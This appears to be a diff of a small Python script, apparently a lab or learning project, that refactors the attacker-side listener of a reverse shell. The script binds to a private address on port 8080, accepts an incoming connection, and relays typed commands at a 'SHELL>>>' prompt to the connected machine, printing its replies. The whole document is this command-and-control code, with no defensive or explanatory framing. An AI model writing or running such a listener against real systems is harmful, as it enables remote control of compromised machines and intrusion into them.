@@ -2,33 +2,39 @@
 
 import socket
 
-def connect():
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.bind(("192.168.74.132", 8080))
-        s.listen(1)
-        print("[+] Listening for TCP connection on PORT 8080")
-        
-        conn, addr = s.accept()
-        print("[+] Connection established with:", addr)
+ip_addr = "192.168.74.132"
+port = 8080
 
-        while True:
-            command = input("Shell> ").encode()  # Encode user input to bytes before sending
-            if b'terminate' in command:
-                conn.send(b'terminate')
-                conn.close()
-                break
-            else:
-                conn.send(command)
-                response = conn.recv(1024)
-                print(response.decode())  # Decode response bytes before printing
-    except Exception as e:
-        print("Error:", e)
-    finally:
-        s.close()
+
+def connect():
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind((ip_addr, port))
+    s.listen(1)
+
+    print("[!] Listening TCP connection from PORT 8080")
+
+    conn, addr = s.accept()
+
+    print("[+] We got a connection from : ", addr)
+
+    while True:
+
+        command = input("SHELL>>>").encode()
+
+        if b"terminate" in command:
+            conn.send(b"terminate")
+            conn.close()
+            break
+        else:
+            conn.send(command)
+            response = conn.recv(1024)
+            print(response.decode())
+
 
 def main():
     connect()
+
 
 if __name__ == "__main__":
     main()
